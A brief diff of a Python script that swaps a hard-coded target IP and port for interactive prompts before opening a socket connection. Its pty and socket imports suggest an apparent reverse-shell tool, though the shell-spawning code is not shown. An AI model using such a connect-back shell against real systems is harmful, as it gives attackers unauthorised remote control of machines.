@@ -5,8 +5,8 @@ import pty
 import socket
 import sys
 
-target_ip = "192.168.1.127" #CHANGE THIS
-target_port = "1337" #CHANGE THIS
+target_ip = input("Please input the target IP: ")
+target_port = input("Please input the target Port: ")
 
 #Create and connect to socket
 s = socket.socket()
